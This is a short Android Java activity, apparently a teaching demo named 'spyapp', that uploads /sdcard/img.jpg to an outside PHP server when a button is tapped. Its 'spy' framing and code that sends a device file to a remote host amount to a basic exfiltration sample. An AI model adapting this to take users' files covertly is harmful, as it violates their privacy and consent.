package com.example.spyapp;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

public class SpyActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		
		Button sendButton = (Button) findViewById(R.id.button1);
		final SpyActivity zis = this;
		sendButton.setOnClickListener(new View.OnClickListener() {
		    public void onClick(View view) {
		    	try {
		            upload();
		            Toast.makeText(zis, "Upload suceeded", Toast.LENGTH_LONG).show();
		        } catch (Exception e) {
		            Toast.makeText(zis, "ERREUR: "+e.toString(), Toast.LENGTH_LONG).show();  
		            e.printStackTrace();
		        }
		    }
		});
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}
	
	
	public void upload() throws Exception {
        HttpURLConnection connection = null;
        DataOutputStream outputStream = null;

        String pathToOurFile = "/sdcard/img.jpg";
        String urlServer = "http://uqac.netii.net/sendimage.php";
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";

        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        int maxBufferSize = 1 * 1024 * 1024;

            FileInputStream fileInputStream = new FileInputStream(new File(pathToOurFile));
            URL url = new URL(urlServer);

            connection = (HttpURLConnection) url.openConnection();
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Connection", "Keep-Alive");
            connection.setRequestProperty("Content-Type",
                    "multipart/form-data;boundary=" + boundary);

            outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.writeBytes(twoHyphens + boundary + lineEnd);
            outputStream
                    .writeBytes("Content-Disposition: form-data; name=\"uploadedfile\";filename=\""
                            + pathToOurFile + "\"" + lineEnd);
            outputStream.writeBytes(lineEnd);

            bytesAvailable = fileInputStream.available();
            bufferSize = Math.min(bytesAvailable, maxBufferSize);
            buffer = new byte[bufferSize];

            bytesRead = fileInputStream.read(buffer, 0, bufferSize);

            while (bytesRead > 0) {
                outputStream.write(buffer, 0, bufferSize);
                bytesAvailable = fileInputStream.available();
                bufferSize = Math.min(bytesAvailable, maxBufferSize);
                bytesRead = fileInputStream.read(buffer, 0, bufferSize);
            }

            outputStream.writeBytes(lineEnd);
            outputStream.writeBytes(twoHyphens + boundary + twoHyphens
                    + lineEnd);

            String serverResponseMessage = connection.getResponseMessage();

            Toast.makeText(this, serverResponseMessage, Toast.LENGTH_LONG).show();

            fileInputStream.close();
            outputStream.flush();
            outputStream.close();
    }
}
